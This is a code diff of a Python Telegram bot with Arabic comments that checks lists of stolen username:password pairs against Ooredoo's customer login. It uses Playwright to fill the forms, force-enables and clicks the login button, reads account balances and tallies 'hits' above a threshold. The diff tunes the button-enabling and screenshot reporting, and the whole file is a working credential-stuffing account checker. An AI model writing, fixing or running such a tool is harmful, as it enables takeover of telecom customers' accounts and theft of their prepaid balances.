@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Ooredoo Railway Bot - locator.fill() version
+Ooredoo Railway Bot - locator.fill() + wait for button enabled
 """
 
 import os
@@ -53,9 +53,6 @@ def log_to_file(msg, level="INFO"):
         pass
 
 
-# ============================================================
-#  الحالة
-# ============================================================
 state = {"running": False, "stop": False, "stats": None}
 
 
@@ -105,9 +102,6 @@ class Stats:
         return "\n".join(lines)
 
 
-# ============================================================
-#  Helpers
-# ============================================================
 def parse_accounts(text):
     out = []
     for line in text.split("\n"):
@@ -155,9 +149,6 @@ def is_invalid_creds(text):
     ])
 
 
-# ============================================================
-#  انتظار الصفحة
-# ============================================================
 async def wait_page_ready(page, timeout=30):
     start = time.time()
     while time.time() - start < timeout:
@@ -178,99 +169,116 @@ async def wait_page_ready(page, timeout=30):
     return False
 
 
-# ============================================================
-#  تعبئة الحقول — locator.fill() (الأفضل مع Vue)
-# ============================================================
 async def fill_username(page, username):
-    """locator.fill() — الطريقة الأفضل مع Vue/Vuetify"""
     log_to_file(f"fill_username: {username}")
-
-    # 1) aria-label='Username'
     try:
         loc = page.locator("input[aria-label='Username']")
-        cnt = await loc.count()
-        log_to_file(f"  aria-label count: {cnt}")
-        if cnt > 0:
+        if await loc.count() > 0:
             await loc.first.fill(username)
             await page.wait_for_timeout(200)
             val = await loc.first.input_value()
-            log_to_file(f"  after fill: '{val}'")
             if val == username:
                 log_to_file("  SUCCESS via aria-label")
                 return True
     except Exception as e:
         log_to_file(f"  aria-label failed: {e}", "ERROR")
 
-    # 2) input[type=text]
     try:
         loc = page.locator("input[type='text']").first
-        cnt = await loc.count()
-        log_to_file(f"  input[type=text] count: {cnt}")
-        if cnt > 0:
+        if await loc.count() > 0:
             await loc.fill(username)
             await page.wait_for_timeout(200)
-            val = await loc.input_value()
-            log_to_file(f"  after fill: '{val}'")
-            if val == username:
+            if await loc.input_value() == username:
                 log_to_file("  SUCCESS via type=text")
                 return True
     except Exception as e:
         log_to_file(f"  type=text failed: {e}", "ERROR")
 
-    # 3) أي input مش password
-    try:
-        loc = page.locator("input:not([type='password']):not([type='hidden'])").first
-        if await loc.count() > 0:
-            await loc.fill(username)
-            await page.wait_for_timeout(200)
-            val = await loc.input_value()
-            log_to_file(f"  after fill: '{val}'")
-            if val == username:
-                log_to_file("  SUCCESS via generic")
-                return True
-    except Exception as e:
-        log_to_file(f"  generic failed: {e}", "ERROR")
-
-    log_to_file("  ALL FAILED", "ERROR")
+    log_to_file("  FAILED", "ERROR")
     return False
 
 
 async def fill_password(page, password):
-    """locator.fill() لكلمة السر"""
-    log_to_file("fill_password")
-
     try:
         loc = page.locator("input[type='password']").first
-        cnt = await loc.count()
-        log_to_file(f"  password count: {cnt}")
-        if cnt > 0:
+        if await loc.count() > 0:
             await loc.fill(password)
             await page.wait_for_timeout(200)
-            val = await loc.input_value()
-            log_to_file(f"  after fill: len={len(val or '')}")
-            if val == password:
-                log_to_file("  SUCCESS")
+            if await loc.input_value() == password:
+                log_to_file("  pwd SUCCESS")
                 return True
     except Exception as e:
-        log_to_file(f"  failed: {e}", "ERROR")
-
+        log_to_file(f"  pwd failed: {e}", "ERROR")
     return False
 
 
 async def click_connexion(page):
+    """نستنو الزّر يفعّل ثم نضغطو"""
+    log_to_file("click_connexion")
+
+    # 1) get_by_role
     try:
-        return bool(await page.evaluate("""
+        btn = page.get_by_role("button", name=re.compile("connexion", re.I))
+        cnt = await btn.count()
+        log_to_file(f"  get_by_role count: {cnt}")
+        if cnt > 0:
+            el = btn.first
+            for i in range(20):
+                d = await el.get_attribute("disabled")
+                if d is None:
+                    log_to_file(f"  enabled after {i*0.5}s")
+                    break
+                await asyncio.sleep(0.5)
+            try:
+                await el.click(timeout=5000)
+                log_to_file("  clicked get_by_role")
+                return True
+            except Exception:
+                await el.click(force=True, timeout=5000)
+                log_to_file("  clicked force get_by_role")
+                return True
+    except Exception as e:
+        log_to_file(f"  role failed: {e}", "ERROR")
+
+    # 2) class
+    try:
+        btn = page.locator("button[aria-label='Connexion'], button.login-window-btn").first
+        if await btn.count() > 0:
+            for i in range(20):
+                d = await btn.get_attribute("disabled")
+                if d is None:
+                    break
+                await asyncio.sleep(0.5)
+            try:
+                await btn.click(timeout=5000)
+            except Exception:
+                await btn.click(force=True)
+            log_to_file("  clicked class")
+            return True
+    except Exception as e:
+        log_to_file(f"  class failed: {e}", "ERROR")
+
+    # 3) JS
+    try:
+        ok = await page.evaluate("""
             () => {
                 const btns = [...document.querySelectorAll('button')];
-                const t = btns.find(b => /connexion|se connecter/i.test(b.textContent || ''));
+                const t = btns.find(b => /connexion/i.test(b.textContent || ''));
                 if (!t) return false;
                 t.removeAttribute('disabled');
+                t.disabled = false;
+                t.classList.remove('v-btn--disabled');
                 t.click();
                 return true;
             }
-        """))
-    except Exception:
-        return False
+        """)
+        if ok:
+            log_to_file("  clicked JS")
+            return True
+    except Exception as e:
+        log_to_file(f"  JS failed: {e}", "ERROR")
+
+    return False
 
 
 async def detect_red_error(page):
@@ -346,8 +354,7 @@ async def wait_for_result(page, timeout=45):
 
         if "/sign-in" not in page.url and "/login" not in page.url:
             try:
-                has_pwd = await page.locator("input[type=password]").count()
-                if has_pwd == 0:
+                if await page.locator("input[type=password]").count() == 0:
                     return {"status": "success", "url": page.url}
             except Exception:
                 pass
@@ -357,9 +364,6 @@ async def wait_for_result(page, timeout=45):
     return {"status": "timeout"}
 
 
-# ============================================================
-#  محاولة حساب
-# ============================================================
 async def try_account(browser, user, pwd, bot, chat_id):
     ctx = await browser.new_context(
         locale="fr-FR",
@@ -380,9 +384,8 @@ async def try_account(browser, user, pwd, bot, chat_id):
 
         await page.wait_for_timeout(300)
 
-        # اسم المستخدم
         if not await fill_username(page, user):
-            log_to_file(f"FAIL fill_username for {user}", "ERROR")
+            log_to_file(f"FAIL fill_username", "ERROR")
             await page.screenshot(path="/tmp/fill_fail.png", full_page=True)
             try:
                 with open("/tmp/fill_fail.png", "rb") as f:
@@ -401,9 +404,8 @@ async def try_account(browser, user, pwd, bot, chat_id):
 
         await page.wait_for_timeout(200)
 
-        # كلمة السر
         if not await fill_password(page, pwd):
-            log_to_file(f"FAIL fill_password for {user}", "ERROR")
+            log_to_file(f"FAIL fill_password", "ERROR")
             await page.screenshot(path="/tmp/pwd_fail.png", full_page=True)
             try:
                 with open("/tmp/pwd_fail.png", "rb") as f:
@@ -414,11 +416,33 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await ctx.close()
             return {"status": "error", "msg": "fill_password failed", "stop": True}
 
-        await page.wait_for_timeout(300)
+        # ✅ ننتظرو شوية باش Vue يفعّل الزّر
+        await page.wait_for_timeout(800)
 
-        # Connexion
+        # نصوّرو قبل الضغط
+        await page.screenshot(path="/tmp/before_click.png", full_page=False)
+        try:
+            with open("/tmp/before_click.png", "rb") as f:
+                await bot.send_photo(chat_id=chat_id, photo=f,
+                                      caption=f"📸 قبل الضغط: {user}")
+        except Exception:
+            pass
+
         if not await click_connexion(page):
             log_to_file("No Connexion button", "ERROR")
+            await page.screenshot(path="/tmp/no_btn.png", full_page=False)
+            try:
+                with open("/tmp/no_btn.png", "rb") as f:
+                    await bot.send_photo(chat_id=chat_id, photo=f,
+                                          caption=f"❌ زر Connexion: {user}")
+            except Exception:
+                pass
+            try:
+                with open(LOG_FILE, "rb") as f:
+                    await bot.send_document(chat_id=chat_id, document=f,
+                                             filename="bot.log", caption="📋 Logs")
+            except Exception:
+                pass
             await ctx.close()
             return {"status": "error", "msg": "no button", "stop": True}
 
@@ -433,14 +457,11 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await page.wait_for_timeout(2000)
             body = await page.inner_text("body")
             bal = find_balance_in_text(body)
-            log_to_file(f"Success! balance={bal}")
             await ctx.close()
             return {"status": "success", "balance": bal}
 
         if result["status"] == "error":
             err = result["error"]
-            log_to_file(f"Error: {err}")
-
             try:
                 with open("/tmp/after.png", "rb") as f:
                     await bot.send_photo(chat_id=chat_id, photo=f,
@@ -458,7 +479,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
             await ctx.close()
             return {"status": "error", "msg": err, "stop": True}
 
-        log_to_file("Timeout", "WARN")
         await ctx.close()
         return {"status": "error", "msg": "timeout", "stop": True}
 
@@ -471,9 +491,6 @@ async def try_account(browser, user, pwd, bot, chat_id):
         return {"status": "error", "msg": str(e), "stop": True}
 
 
-# ============================================================
-#  الفحص
-# ============================================================
 async def run_check(app, chat_id, accounts):
     stats = Stats()
     stats.total = len(accounts)
@@ -482,7 +499,7 @@ async def run_check(app, chat_id, accounts):
 
     await bot.send_message(chat_id=chat_id,
         text=(f"🚀 <b>بداية الفحص</b>\nعدد: <b>{len(accounts)}</b>\n"
-              f"الحد: <b>{MIN_BALANCE}</b> دج\n/stop للإيقاف."),
+              f"الحد: <b>{MIN_BALANCE}</b> دج"),
         parse_mode="HTML")
 
     async with async_playwright() as p:
@@ -500,11 +517,9 @@ async def run_check(app, chat_id, accounts):
                     attempts += 1
                     if state["stop"]:
                         break
-
                     try:
                         r = await try_account(browser, user, pwd, bot, chat_id)
                     except Exception:
-                        log_to_file("account failed", "ERROR")
                         r = {"status": "error", "msg": "exception", "stop": True}
 
                     if r.get("stop"):
@@ -547,7 +562,7 @@ async def run_check(app, chat_id, accounts):
                 if time.time() - last_update > 15:
                     try:
                         await bot.send_message(chat_id=chat_id,
-                            text=(f"⏳ <b>تقدم</b> {idx}/{len(accounts)}\n"
+                            text=(f"⏳ {idx}/{len(accounts)}\n"
                                   f"✅ {stats.success} | 💰 {stats.hit} | "
                                   f"❌ {stats.invalid} | 🛑 {stats.errors}"),
                             parse_mode="HTML")
@@ -568,14 +583,9 @@ async def run_check(app, chat_id, accounts):
     state["stop"] = False
 
 
-# ============================================================
-#  Handlers
-# ============================================================
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🚀 <b>بوت Ooredoo</b>\n\n"
-        "ابعتلي ملف <code>accounts.txt</code>\n"
-        "/start /status /stop /log",
+        "🚀 بوت Ooredoo\n\nابعتلي ملف accounts.txt\n/start /status /stop /log",
         parse_mode="HTML")
 
 
@@ -583,8 +593,7 @@ async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     if state["running"]:
         s = state["stats"]
         await update.message.reply_text(
-            f"⏳ تم: {s.done}/{s.total}\n"
-            f"✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid}",
+            f"⏳ {s.done}/{s.total}\n✅ {s.success} | 💰 {s.hit} | ❌ {s.invalid}",
             parse_mode="HTML")
     else:
         await update.message.reply_text("✅ جاهز.")
@@ -601,7 +610,7 @@ async def cmd_log(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
 
 async def cmd_stop(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state["stop"] = True
-    await update.message.reply_text("⏹️ جاري الإيقاف...")
+    await update.message.reply_text("⏹️")
 
 
 async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
@@ -623,8 +632,7 @@ async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
     state["running"] = True
     state["stop"] = False
     await update.message.reply_text(
-        f"📄 توصلت بـ <b>{len(accounts)}</b> حساب\nنبداو...",
-        parse_mode="HTML")
+        f"📄 {len(accounts)} حساب. نبداو...", parse_mode="HTML")
     asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
 
 
@@ -642,15 +650,12 @@ async def handle_text(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         state["running"] = True
         state["stop"] = False
         await update.message.reply_text(
-            f"📄 <b>{len(accounts)}</b> حساب.", parse_mode="HTML")
+            f"📄 {len(accounts)} حساب.", parse_mode="HTML")
         asyncio.create_task(run_check(ctx.application, update.effective_chat.id, accounts))
     else:
         await update.message.reply_text("💡 ابعتلي ملف.")
 
 
-# ============================================================
-#  Main
-# ============================================================
 def main():
     print("🚀 Ooredoo Bot starting...")
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
